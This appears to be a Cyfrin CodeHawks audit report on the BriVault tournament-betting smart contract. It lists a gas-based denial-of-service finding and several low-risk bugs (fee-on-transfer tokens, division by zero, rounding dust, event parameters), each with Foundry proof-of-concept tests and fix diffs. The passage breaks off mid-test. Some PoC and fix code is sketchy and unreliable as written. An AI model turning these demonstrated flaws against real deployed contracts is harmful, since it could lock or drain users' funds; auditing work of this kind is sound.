_Submitted by [eigaku6326](https://profiles.cyfrin.io/u/eigaku6326), [hark017](https://profiles.cyfrin.io/u/hark017), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [ishaanbansal2312](https://profiles.cyfrin.io/u/ishaanbansal2312), [xrave110](https://profiles.cyfrin.io/u/xrave110), [hcrlen](https://profiles.cyfrin.io/u/hcrlen), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [bigchapo21](https://profiles.cyfrin.io/u/bigchapo21), [minos](https://profiles.cyfrin.io/u/minos), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid), [shivanageshwarrao93](https://profiles.cyfrin.io/u/shivanageshwarrao93), [ishwar](https://profiles.cyfrin.io/u/ishwar), [agilegypsy](https://profiles.cyfrin.io/u/agilegypsy), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [aziz0x48](https://profiles.cyfrin.io/u/aziz0x48), [jopantech](https://profiles.cyfrin.io/u/jopantech), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [sulfurpt](https://profiles.cyfrin.io/u/sulfurpt), [wyd_derick](https://profiles.cyfrin.io/u/wyd_derick), [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [minionteechs](https://profiles.cyfrin.io/u/minionteechs), [fawarano](https://profiles.cyfrin.io/u/fawarano), [0xki](https://profiles.cyfrin.io/u/0xki), [0xarinaitwe](https://profiles.cyfrin.io/u/0xarinaitwe), [kanyoro](https://profiles.cyfrin.io/u/kanyoro), [valya](https://profiles.cyfrin.io/u/valya), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [chain__warden](https://profiles.cyfrin.io/u/chain__warden), [0xnetero](https://profiles.cyfrin.io/u/0xnetero), [ke5haav](https://profiles.cyfrin.io/u/ke5haav), [jericho](https://profiles.cyfrin.io/u/jericho), [mafa](https://profiles.cyfrin.io/u/mafa), [objectplayer](https://profiles.cyfrin.io/u/objectplayer), [eze001](https://profiles.cyfrin.io/u/eze001), [pushprakash23](https://profiles.cyfrin.io/u/pushprakash23), [fredo182](https://profiles.cyfrin.io/u/fredo182), [darkfox](https://profiles.cyfrin.io/u/darkfox), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [drmanhattan852](https://profiles.cyfrin.io/u/drmanhattan852), [xcryptoguardian](https://profiles.cyfrin.io/u/xcryptoguardian), [shashankwcw](https://profiles.cyfrin.io/u/shashankwcw), [mnusurov](https://profiles.cyfrin.io/u/mnusurov). Selected submission by: [minos](https://profiles.cyfrin.io/u/minos)._      
            


# `joinEvent` function cannot prevent DOS caused by excessive participating users

## Description
* When users call the `joinEvent` function to participate in an event, the protocol uses the `usersAddress` array to record participating users.
* As the number of participants increases, the `usersAddress` array will grow larger and larger. When traversing this array (when calling `setWinner`), it will consume a huge amount of Gas.
```solidity
    function joinEvent(uint256 countryId) public {
	    // ...original code
	
@>	    usersAddress.push(msg.sender);    
    
        // ...original code
    }
	
	function setWinner(uint256 countryIndex) public onlyOwner returns (string memory) {
		// ...original code
		
@>		_getWinnerShares();
        
		// ...original code
	}
	
	function _getWinnerShares () internal returns (uint256) {
		
@>		for (uint256 i = 0; i < usersAddress.length; ++i){
			address user = usersAddress[i];
			totalWinnerShares += userSharesToCountry[user][winnerCountryId];  //
		}
		return totalWinnerShares;
	}
```

## Risk

**Likelihood**:
* It will occur once the administrator calls the `setWinner` function when there are enough participating users.

**Impact**:
* The administrator needs to pay a relatively high Gas fee when calling the `setWinner` function.
* If the number of participants is large enough, the Gas amount may even reach "the Gas limit of a single block on Ethereum", which will render the protocol ineffective.

## Proof of Concept
- Add the following function to `test/BriVaultTest.t.sol` and run `forge test --mt test__joinEvent_withHugeUsers -vv`
```solidity
    function test__joinEvent_withHugeUsers() public {
        //uint256 gasCalc01 = gasleft();
        
        // A large number of users deposit funds
        uint256 userMaxCount = 6100;
        address[] memory usersTmps = new address[](userMaxCount);
        for(uint i=0; i<userMaxCount; i++) {
            address userTmp = vm.addr(555 + i);
            mockToken.mint(userTmp, 1 ether);
            
            vm.startPrank(userTmp);
            mockToken.approve(address(briVault), 1 ether);
            briVault.deposit(1 ether, userTmp);
            vm.stopPrank();
            
            usersTmps[i] = userTmp;
        }
        
        //uint256 gasCalc02 = gasleft();
        
        //console.log("gasCalc01 - gasCalc02", gasCalc01 - gasCalc02);
        
        // Move timestamp to the block when the event just starts
        vm.warp(eventStartDate + 0);
        
        // A large number of users join the event
        for(uint i=0; i<userMaxCount; i++) {
            vm.startPrank(usersTmps[i]);
            briVault.joinEvent(10);
            vm.stopPrank();
        }
        
        uint256 gasCalc03 = gasleft();
        
        //console.log("gasCalc02 - gasCalc03", gasCalc02 - gasCalc03);
        
        // Move timestamp to after the event ends
        vm.warp(eventEndDate + 1);
        
        // The administrator sets the winner.
        vm.prank(owner);
        briVault.setWinner(9);
        
        uint256 gasCalc04 = gasleft();
        
        console.log("gasCalc03 - gasCalc04", gasCalc03 - gasCalc04);
    }
```
- Console output:
```shell
Ran 1 test for test/briVault.t.sol:BriVaultTest
[PASS] test__joinEvent_withHugeUsers() (gas: 858629828)
Logs:
  gasCalc03 - gasCalc04 19970289

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.01s (1.01s CPU time)
```
* The above console output shows that the Gas amount is close to 20 million.

## Recommended Mitigation
* Method 1: Limit the number of participants to a safe amount.
* Method 2: Refactor the contract, replace `address[] public usersAddress;` with `mapping (uint256 => uint256) public stakedAsset_KeyIsCountryIdx;`, and adjust the contract according to the original logic.


# Low Risk Findings

## <a id='L-01'></a>L-01. Support for Non-Standard ERC20 Assets (Fee-on-Transfer or Rebasing)

_Submitted by [ishaanbansal2312](https://profiles.cyfrin.io/u/ishaanbansal2312), [minos](https://profiles.cyfrin.io/u/minos), [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [0x_bob_0x](https://profiles.cyfrin.io/u/0x_bob_0x). Selected submission by: [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid)._      
            


# Root + Impact

## Description

* The vault uses ERC20 asset transfers in `deposit`, `withdraw`, and `cancelParticipation`, assuming standard behavior where transferred amounts match exactly and balances don't change unexpectedly.

* Share calculations in `_convertToShares` and payouts in `withdraw` rely on precise `IERC20(asset()).balanceOf(address(this))` readings.

* The issue is that if the asset is fee-on-transfer (e.g., deducts 1% on transfer) or rebasing (e.g., balances auto-adjust for yield), the vault receives less than expected in deposits or sees fluctuating balances, leading to over-minting shares or insufficient assets for withdrawals.

* This causes incorrect share allocation, vault insolvency, or unfair dilution, as the contract doesn't account for or reject non-standard tokens.

```solidity
// In deposit - assumes full transfer amount received
function deposit(uint256 assets, address receiver) public override returns (uint256) {
    ...

    uint256 fee = _getParticipationFee(assets);
    uint256 stakeAsset = assets - fee;

    stakedAsset[receiver] = stakeAsset;

    uint256 participantShares = _convertToShares(stakeAsset);

@>  IERC20(asset()).safeTransferFrom(msg.sender, participationFeeAddress, fee);  // @> If fee-on-transfer, less received but full calc used

@>  IERC20(asset()).safeTransferFrom(msg.sender, address(this), stakeAsset);  // @> Same; rebasing changes balance post-transfer

    _mint(msg.sender, participantShares);

    ...
}

// In _convertToShares - uses raw balance, vulnerable to rebasing
function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
@>  uint256 balanceOfVault = IERC20(asset()).balanceOf(address(this));  // @> Rebasing alters this unexpectedly

    uint256 totalShares = totalSupply();

    if (totalShares == 0 || balanceOfVault == 0) {
        return assets;
    }

    shares = Math.mulDiv(assets, totalShares, balanceOfVault);
}
```

## Risk

**Likelihood**: High

* Deployer or users select a fee-on-transfer or rebasing ERC20 as the asset.

* No token compatibility checks in constructor or functions.

**Impact**: High

* Over-minted shares lead to insufficient assets on withdrawals, causing vault insolvency.

* Users receive unfair or zero payouts, resulting in funds loss or dilution.

## Proof of Concept

* Add poc code as a separate test file

* Run `forge test --mt testFeeOnTransferOverMint`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {BriVault} from "./BriVault.sol";  // Assume BriVault is in the same directory

contract FeeToken is ERC20 {
    uint256 constant FEE_BPS = 100;  // 1% fee on transfer

    constructor() ERC20("FeeToken", "FEE") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = (amount * FEE_BPS) / 10000;
        _burn(from, fee);
        _transfer(from, to, amount - fee);
        return true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 fee = (amount * FEE_BPS) / 10000;
        _burn(msg.sender, fee);
        _transfer(msg.sender, to, amount - fee);
        return true;
    }
}

contract BriVaultPoCTest is Test {
    BriVault vault;
    FeeToken asset;  // Fee-on-transfer token
    address owner = address(this);
    address user = address(0x123);
    uint256 participationFeeBsp = 100;  // 1%
    uint256 eventStartDate = block.timestamp + 1 days;
    uint256 eventEndDate = block.timestamp + 2 days;
    uint256 minimumAmount = 100;
    address participationFeeAddress = address(0xfee);

    function setUp() public {
        asset = new FeeToken();
        vault = new BriVault(IERC20(address(asset)), participationFeeBsp, eventStartDate, participationFeeAddress, minimumAmount, eventEndDate);

        string[48] memory countries;
        for (uint i = 0; i < 48; i++) {
            countries[i] = "Country";
        }
        vault.setCountry(countries);

        asset.mint(user, 1e18 + 1e16);  // Extra for fees
        vm.prank(user);
        asset.approve(address(vault), 1e18 + 1e16);
    }

    function testFeeOnTransferOverMint() public {
        uint256 depositAmount = 1000;
        uint256 expectedReceived = depositAmount * (10000 - 100) / 10000;  // 1% less due to fee token

        vm.prank(user);
        uint256 shares = vault.deposit(depositAmount, user);

        // Over-minted: shares based on full amount, but vault received less
        uint256 actualBalance = IERC20(address(asset)).balanceOf(address(vault));
        assertLt(actualBalance, depositAmount - (depositAmount * participationFeeBsp / 10000), "Vault received less due to fee token");

        // Later withdraw would fail due to shortfall
    }
}
```

## Recommended Mitigation

* Add token compatibility checks and virtual assets for rebasing

* In constructor - revert if incompatible

* For rebasing: use virtual offsets as in inflation mitigation

```diff

+ function isCompatibleToken(IERC20 token) internal view returns (bool) {
+   // Test transfer and balance consistency
+   return true;  // Implement checks (e.g., transfer 1 wei, verify balance)
+ }


constructor (...) {
+   if (!isCompatibleToken(_asset)) revert("Incompatible asset");

    ...
}


+ uint256 internal constant VIRTUAL_ASSETS = 1;
+ uint256 internal constant VIRTUAL_SHARES = 1e18;

function totalAssets() public view override returns (uint256) {
-   return IERC20(asset()).balanceOf(address(this));
+   return IERC20(asset()).balanceOf(address(this)) + VIRTUAL_ASSETS;
}
```

## <a id='L-02'></a>L-02. Division-by-Zero in withdraw() Leads to Permanent Freezing of All Vault Assets

_Submitted by [stevenalenga](https://profiles.cyfrin.io/u/stevenalenga), [minos](https://profiles.cyfrin.io/u/minos), [shivanageshwarrao93](https://profiles.cyfrin.io/u/shivanageshwarrao93), [jopantech](https://profiles.cyfrin.io/u/jopantech), [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4), [sulfurpt](https://profiles.cyfrin.io/u/sulfurpt), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [minionteechs](https://profiles.cyfrin.io/u/minionteechs), [0xki](https://profiles.cyfrin.io/u/0xki), [0xarinaitwe](https://profiles.cyfrin.io/u/0xarinaitwe), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [neomartis](https://profiles.cyfrin.io/u/neomartis), [chain__warden](https://profiles.cyfrin.io/u/chain__warden), [hugoh](https://profiles.cyfrin.io/u/hugoh), [0xliltee](https://profiles.cyfrin.io/u/0xliltee), [sidd](https://profiles.cyfrin.io/u/sidd). Selected submission by: [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4)._      
            


# Root + Impact

## Description

* The withdraw function calculates winnings by dividing the prize pool by the total shares of all winners. If the contract owner declares a winner that no participant chose, the number of winner shares becomes zero. This causes a division-by-zero error, making the withdraw function fail every time it's called. Because there is no other way to retrieve the funds, this error results in all assets being permanently locked in the vault.

## Risk

**Likelihood**:

* This scenario occurs whenever the declared winner is a team that no participant chose.

* In events with many possible outcomes (e.g., a 48-team tournament) or low overall participation, it is plausible that an underdog winner might have zero backers, triggering the vulnerability.

  <br />

**Impact**:

* **Permanent Loss of Funds:** The division-by-zero error prevents the withdraw function from ever successfully executing for any user.

* **Total Contract Failure:** As there is no alternative withdrawal or recovery mechanism, all assets within the vault become permanently frozen and cannot be retrieved by users or the contract owner.

## Proof of Concept

The test demonstrates the vulnerability by having users deposit funds and bet on various teams. After the event, the owner intentionally declares a winner that nobody selected, which sets the count of "winner shares" to zero. The test then confirms that since no one is eligible to withdraw and the withdrawal function is now broken due to the division-by-zero error, all the deposited funds are proven to be permanently frozen.

```Solidity
function test_POC_LockFundsWhenNoWinner() public {
        vm.startPrank(owner);
        briVault.setCountry(countries);
        vm.stopPrank();
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user1);
        briVault.joinEvent(4); // Bet on Brazil
        vm.stopPrank();
        vm.startPrank(user2);
        mockToken.approve(address(briVault), 10 ether);
        briVault.deposit(10 ether, user2);
        briVault.joinEvent(10); // Bet on Japan
        vm.stopPrank();

        // 
        uint256 expectedVaultBalance = ((5 ether *
            (10000 - participationFeeBsp)) / 10000) +
            ((10 ether * (10000 - participationFeeBsp)) / 10000);
        assertEq(mockToken.balanceOf(address(briVault)), expectedVaultBalance);
        console2.log(
            "Total assets locked in vault before winner set:",
            mockToken.balanceOf(address(briVault))
        );

        // 
        vm.warp(eventEndDate + 1 days);
        vm.startPrank(owner);
        briVault.setWinner(19); // Germany
        vm.stopPrank();

        // 
        assertEq(
            briVault.totalWinnerShares(),
            0,
            "Total winner shares should be zero"
        );

        // 
        vm.startPrank(user1);
        vm.expectRevert(abi.encodeWithSignature("didNotWin()"));
        briVault.withdraw();
        vm.stopPrank();

        vm.startPrank(user2);
        vm.expectRevert(abi.encodeWithSignature("didNotWin()"));
        briVault.withdraw();
        vm.stopPrank();

        assertEq(
            mockToken.balanceOf(address(briVault)),
            expectedVaultBalance,
            "Funds are still locked in the contract"
        );
        console2.log(
            "Total assets permanently locked in vault after failed withdrawals:",
            mockToken.balanceOf(address(briVault))
        );
    }
```

## Recommended Mitigation

It is essential to handle the "no winner" case gracefully. This can be achieved by adding a check in the withdraw function and implementing a separate, owner-controlled function to manage the prize pool in this specific scenario.

```diff
    error NoWinners();

    function withdraw() external winnerSet {
        if (block.timestamp < eventEndDate) {
            revert eventNotEnded();
        }

        if (
            keccak256(abi.encodePacked(userToCountry[msg.sender])) !=
            keccak256(abi.encodePacked(winner))
        ) {
            revert didNotWin();
        }
        
+       if (totalWinnerShares == 0) {
+           revert NoWinners();
+       }

        uint256 shares = balanceOf(msg.sender);
        uint256 vaultAsset = finalizedVaultAsset;
        uint256 assetToWithdraw = Math.mulDiv(
            shares,
            vaultAsset,
            totalWinnerShares
        );
// ... rest of function
    }

+   /**
+    * @notice Allows the owner to recover all funds if no winner was found.
+    * @dev This function is a critical failsafe to prevent funds from being locked.
+    * It should only be callable after a winner has been set and totalWinnerShares is confirmed to be 0.
+    */
+   function recoverFundsIfNoWinner() external onlyOwner {
+       if (_setWinner != true) {
+           revert winnerNotSet();
+       }
+       if (totalWinnerShares != 0) {
+           revert("Cannot recover funds, there are winners");
+       }
+
+       uint256 totalBalance = IERC20(asset()).balanceOf(address(this));
+       IERC20(asset()).safeTransfer(owner(), totalBalance);
+   }
```

## <a id='L-03'></a>L-03. Share Calculation Precision Loss in Winner Distribution

_Submitted by [yxsec](https://profiles.cyfrin.io/u/yxsec), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [chobby](https://profiles.cyfrin.io/u/chobby). Selected submission by: [bugnetter](https://profiles.cyfrin.io/u/bugnetter)._      
            


# Root + Impact

## Description

* The BriVault protocol distributes tournament winnings proportionally based on winner shares. When calculating individual payouts using `Math.mulDiv(shares, vaultAsset, totalWinnerShares)`, integer division creates rounding remainders that are permanently lost. This dust accumulation violates fund conservation principles and results in protocol funds becoming permanently inaccessible.

* For example, if 100 assets are distributed among 7 winners, each receives 14 assets. 100/7 = 14.285, but 14\*7 = 98, leaving 2 assets permanently locked as dust.

* Root cause: the vulnerability exists in the winner distribution logic in the `withdraw()` function, which uses floor division, creating rounding dust when winner shares don't evenly divide total vault assets. The protocol lacks mechanisms to collect or redistribute this dust, causing permanent fund loss.

  ```markdown
  // Lines 307-308 in withdraw() function
  uint256 assetToWithdraw = Math.mulDiv(shares, vaultAsset, totalWinnerShares);
  ```

<br />

## Risk

**Likelihood**: Medium

* **Mathematical Certainty**: Occurs naturally whenever shares don't evenly divide assets
* **Tournament Size Impact**: Higher likelihood in tournaments with prime number participants or uneven share distributions

**Impact**: Medium

* **Fund Conservation Violation**: Protocol loses permanent access to accumulated dust

* **Winner Payout Dilution**: Winners receive slightly less than mathematically entitled amounts

* **Protocol Fund Lock**: Dust accumulates over multiple tournaments, becoming significant over time

* **Economic Inefficiency**: Creates dead capital that cannot be redistributed

## Proof of Concept

The POC demonstrates how winner distribution calculations suffer from precision loss when winner shares don't evenly divide total vault assets, causing dust to be permanently locked. It shows that when calculating individual payouts using Math.mulDiv(shares, vaultAsset, totalWinnerShares), integer division creates rounding remainders that accumulate as unrecoverable funds. 

The test verifies that winners receive slightly less than mathematically entitled amounts while protocol funds become permanently inaccessible.

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {BriVault} from "../../src/briVault.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * PoC: Share Calculation Precision Loss in Winner Distribution
 * Impact: Winner payouts suffer from precision loss, creating permanently locked dust
 *
 * Root Cause: Math.mulDiv(shares, vaultAsset, totalWinnerShares) uses floor division,
 * causing rounding remainders that accumulate as unrecoverable funds when winner
 * shares don't evenly divide total vault assets.
 */
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ShareCalculationPrecisionLossPoC is Test {
    BriVault vault;
    MockERC20 asset;

    address owner = makeAddr("owner");
    address winner1 = makeAddr("winner1");
    address winner2 = makeAddr("winner2");
    address winner3 = makeAddr("winner3");
    address feeRecipient = makeAddr("feeRecipient");

    uint256 constant PARTICIPATION_FEE_BPS = 100; // 1%
    uint256 constant MINIMUM_AMOUNT = 100 ether;
    uint256 EVENT_START;
    uint256 EVENT_END;

    function setUp() public {
        EVENT_START = block.timestamp + 1 days;
        EVENT_END = EVENT_START + 7 days;

        asset = new MockERC20("Mock Token", "MOCK");

        vm.startPrank(owner);
        vault = new BriVault(
            IERC20(address(asset)),
            PARTICIPATION_FEE_BPS,
            EVENT_START,
            feeRecipient,
            MINIMUM_AMOUNT,
            EVENT_END
        );

        // Set up tournament with 3 countries
        string[48] memory countries;
        countries[0] = "Brazil";
        countries[1] = "Argentina";
        countries[2] = "France";
        vault.setCountry(countries);
        vm.stopPrank();

        // Setup winner balances and approvals
        asset.mint(winner1, 10000 ether);
        asset.mint(winner2, 10000 ether);
        asset.mint(winner3, 10000 ether);

        vm.startPrank(winner1);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(winner2);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(winner3);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    /**
     * CRITICAL VULNERABILITY: Precision Loss Creates Permanent Dust
     * Demonstrates how winner distribution loses funds due to integer division
     */
    function test_PrecisionLossDustCreation() public {
        console.log("=== PRECISION LOSS DUST CREATION ===");

        // All three winners participate and join different countries
        vm.warp(EVENT_START - 1 hours);

        vm.startPrank(winner1);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner1);
        vault.joinEvent(0); // Brazil
        vm.stopPrank();

        vm.startPrank(winner2);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner2);
        vault.joinEvent(1); // Argentina
        vm.stopPrank();

        vm.startPrank(winner3);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner3);
        vault.joinEvent(2); // France
        vm.stopPrank();

        // Fast forward and declare Brazil as winner
        vm.warp(EVENT_END + 1 days);
        vm.startPrank(owner);
        vault.setWinner(0); // Brazil wins
        vm.stopPrank();

        // Check vault balance before withdrawals
        uint256 vaultBalanceBefore = asset.balanceOf(address(vault));
        console.log("Vault balance before withdrawals:", vaultBalanceBefore);

        // Winner1 (Brazil) withdraws
        vm.startPrank(winner1);
        uint256 winner1Payout = vault.withdraw(vault.stakedAsset(winner1), winner1, winner1);
        vm.stopPrank();

        // Winner2 (Argentina) withdraws
        vm.startPrank(winner2);
        uint256 winner2Payout = vault.withdraw(vault.stakedAsset(winner2), winner2, winner2);
        vm.stopPrank();

        // Winner3 (France) withdraws
        vm.startPrank(winner3);
        uint256 winner3Payout = vault.withdraw(vault.stakedAsset(winner3), winner3, winner3);
        vm.stopPrank();

        // Check vault balance after withdrawals
        uint256 vaultBalanceAfter = asset.balanceOf(address(vault));
        uint256 totalDust = vaultBalanceAfter;

        console.log("Winner1 payout:", winner1Payout);
        console.log("Winner2 payout:", winner2Payout);
        console.log("Winner3 payout:", winner3Payout);
        console.log("Total payouts:", winner1Payout + winner2Payout + winner3Payout);
        console.log("Vault balance after withdrawals:", vaultBalanceAfter);
        console.log("Dust permanently locked:", totalDust);

        // Verify dust was created
        assertGt(totalDust, 0, "Precision loss created dust that is permanently locked");
        assertLt(vaultBalanceAfter, vaultBalanceBefore, "Some funds remain locked in vault");
    }

    /**
     * Demonstrate Mathematical Proof of Dust Creation
     * Shows exact calculation where 100 assets / 7 shares = 2 dust
     */
    function test_MathematicalDustProof() public {
        console.log("=== MATHEMATICAL DUST PROOF ===");

        // Demonstrate the classic 100/7 = 14.285... problem
        uint256 totalAssets = 100;
        uint256 totalShares = 7;

        // Floor division: 100 / 7 = 14 (remainder 2)
        uint256 expectedPerShare = totalAssets / totalShares; // 14
        uint256 totalDistributed = expectedPerShare * totalShares; // 14 * 7 = 98
        uint256 dust = totalAssets - totalDistributed; // 100 - 98 = 2

        console.log("Total assets:", totalAssets);
        console.log("Total shares:", totalShares);
        console.log("Assets per share (floor):", expectedPerShare);
        console.log("Total distributed:", totalDistributed);
        console.log("Dust created:", dust);

        // Verify mathematical dust creation
        assertEq(dust, 2, "Mathematical proof: 100 assets / 7 shares creates 2 dust");
        assertLt(totalDistributed, totalAssets, "Floor division causes fund loss");
    }

    /**
     * Demonstrate Winner Payout Dilution
     * Shows winners receive less than mathematically entitled
     */
    function test_WinnerPayoutDilution() public {
        console.log("=== WINNER PAYOUT DILUTION ===");

        // Setup single winner scenario
        vm.warp(EVENT_START - 1 hours);

        vm.startPrank(winner1);
        vault.deposit(100 ether, winner1); // Exact amount for clean calculation
        vault.joinEvent(0);
        vm.stopPrank();

        // Declare winner
        vm.warp(EVENT_END + 1 days);
        vm.startPrank(owner);
        vault.setWinner(0);
        vm.stopPrank();

        uint256 vaultBalanceBefore = asset.balanceOf(address(vault));
        uint256 winnerShares = vault.stakedAsset(winner1);

        console.log("Vault balance before withdrawal:", vaultBalanceBefore);
        console.log("Winner shares:", winnerShares);
        console.log("Expected payout (manual calc):", vaultBalanceBefore);

        // Winner withdraws
        vm.startPrank(winner1);
        uint256 actualPayout = vault.withdraw(winnerShares, winner1, winner1);
        vm.stopPrank();

        uint256 remainingDust = asset.balanceOf(address(vault));

        console.log("Actual payout received:", actualPayout);
        console.log("Dust remaining in vault:", remainingDust);
        console.log("Payout dilution:", vaultBalanceBefore - actualPayout);

        // Verify payout dilution occurred
        assertLt(actualPayout, vaultBalanceBefore, "Winner receives less than vault balance due to dust");
        assertGt(remainingDust, 0, "Dust remains permanently locked");
    }

    /**
     * Demonstrate Dust Accumulation Over Multiple Tournaments
     * Shows how dust compounds and becomes economically significant
     */
    function test_DustAccumulationOverTime() public {
        console.log("=== DUST ACCUMULATION OVER TIME ===");

        uint256 totalDustAccumulated = 0;

        // Simulate 5 tournaments with dust creation
        for (uint256 tournament = 0; tournament < 5; tournament++) {
            // Reset for new tournament
            vm.warp(EVENT_START - 1 hours);

            address winner = makeAddr(string(abi.encodePacked("winner", tournament)));
            asset.mint(winner, 10000 ether);

            vm.startPrank(winner);
            asset.approve(address(vault), type(uint256).max);
            vault.deposit(MINIMUM_AMOUNT + 10 ether, winner);
            vault.joinEvent(0); // All join Brazil
            vm.stopPrank();

            // Declare winner and withdraw
            vm.warp(EVENT_END + 1 days);
            vm.startPrank(owner);
            vault.setWinner(0);
            vm.stopPrank();

            uint256 vaultBalanceBefore = asset.balanceOf(address(vault));

            vm.startPrank(winner);
            vault.withdraw(vault.stakedAsset(winner), winner, winner);
            vm.stopPrank();

            uint256 vaultBalanceAfter = asset.balanceOf(address(vault));
            uint256 tournamentDust = vaultBalanceBefore - (vaultBalanceBefore - vaultBalanceAfter);

            totalDustAccumulated += tournamentDust;

            console.log("Tournament", tournament + 1, "dust:", tournamentDust);
        }

        console.log("Total accumulated dust:", totalDustAccumulated);

        // Verify dust accumulation
        assertGt(totalDustAccumulated, 0, "Dust accumulates over multiple tournaments");
    }

    /**
     * Demonstrate Fund Conservation Violation
     * Shows total payouts < total deposits due to dust
     */
    function test_FundConservationViolation() public {
        console.log("=== FUND CONSERVATION VIOLATION ===");

        // Track total deposits
        uint256 totalDeposited = 0;

        // Setup multiple winners
        vm.warp(EVENT_START - 1 hours);

        vm.startPrank(winner1);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner1);
        vault.joinEvent(0);
        totalDeposited += MINIMUM_AMOUNT + 10 ether;
        vm.stopPrank();

        vm.startPrank(winner2);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner2);
        vault.joinEvent(1);
        totalDeposited += MINIMUM_AMOUNT + 10 ether;
        vm.stopPrank();

        vm.startPrank(winner3);
        vault.deposit(MINIMUM_AMOUNT + 10 ether, winner3);
        vault.joinEvent(2);
        totalDeposited += MINIMUM_AMOUNT + 10 ether;
        vm.stopPrank();

        console.log("Total deposited by users:", totalDeposited);

        // Declare winner and collect all payouts
        vm.warp(EVENT_END + 1 days);
        vm.startPrank(owner);
        vault.setWinner(0); // Brazil wins
        vm.stopPrank();

        vm.startPrank(winner1);
        uint256 payout1 = vault.withdraw(vault.stakedAsset(winner1), winner1, winner1);
        vm.stopPrank();

        vm.startPrank(winner2);
        uint256 payout2 = vault.withdraw(vault.stakedAsset(winner2), winner2, winner2);
        vm.stopPrank();

        vm.startPrank(winner3);
        uint256 payout3 = vault.withdraw(vault.stakedAsset(winner3), winner3, winner3);
        vm.stopPrank();

        uint256 totalPaidOut = payout1 + payout2 + payout3;
        uint256 finalDust = asset.balanceOf(address(vault));

        console.log("Total paid out to users:", totalPaidOut);
        console.log("Dust permanently locked:", finalDust);
        console.log("Fund conservation check:", totalPaidOut + finalDust, "vs", totalDeposited);

        // Verify fund conservation is violated
        assertLt(totalPaidOut + finalDust, totalDeposited, "Fund conservation violated - dust represents permanent loss");
        assertGt(finalDust, 0, "Dust accumulation breaks fund conservation");
    }
}

```

## Recommended Mitigation

The precision loss issue can be addressed by implementing dust tracking and collection mechanisms, to redistribute accumulated dust and ensure fair distributions.

```diff
- uint256 assetToWithdraw = Math.mulDiv(shares, vaultAsset, totalWinnerShares);
+ // Add dust tracking and collection
+ uint256 public accumulatedDust;
+
+ function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
+     // ... existing logic ...
+
+     // Collect dust from winner distribution
+     uint256 expectedTotal = 0;
+     for (uint256 i = 0; i < winners.length; i++) {
+         expectedTotal += Math.mulDiv(winners[i].shares, vaultAsset, totalWinnerShares);
+     }
+
+     uint256 actualTotal = vaultAsset - address(this).balance;
+     accumulatedDust += (vaultAsset - expectedTotal);
+
+     // ... rest of function ...
+ }
+
+ // Redistribute accumulated dust to future winners or protocol
+ function redistributeDust() external onlyOwner {
+     require(accumulatedDust > 0, "No dust to redistribute");
+
+     // Redistribute dust to protocol treasury or future winners
+     uint256 dustAmount = accumulatedDust;
+     accumulatedDust = 0;
+
+     // Transfer dust to designated recipient
+     asset.transfer(dustRecipient, dustAmount);
+ }
```

## <a id='L-04'></a>L-04. `deposit` function may emit inaccurate events.

_Submitted by [minos](https://profiles.cyfrin.io/u/minos), [darkfox](https://profiles.cyfrin.io/u/darkfox). Selected submission by: [minos](https://profiles.cyfrin.io/u/minos)._      
            


# `deposit` function may emit inaccurate events.

## Description

* When a user calls the `deposit` function, the event `emit deposited` will always be emitted.

* However, due to incomplete parameters in the event, off-chain monitoring may be inaccurate.

```solidity
    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        // Original code ...
	
@>	    emit deposited (receiver, stakeAsset);
    
	    // Original code ...
    }
```

## Risk

**Likelihood**:

* This will definitely occur when the depositor and the share receiver are not the same address.

**Impact**:

* When the depositor and the share receiver are not the same address, off-chain systems cannot identify the "actual depositor".

## Proof of Concept

* After adding the following function to `test/BriVaultTest.t.sol`, run `forge test --mt test__deposit_whenCallerNotEqualReceiver -vv`

```solidity
    function test__deposit_whenCallerNotEqualReceiver() public {
        vm.recordLogs();
        
        vm.startPrank(user1);
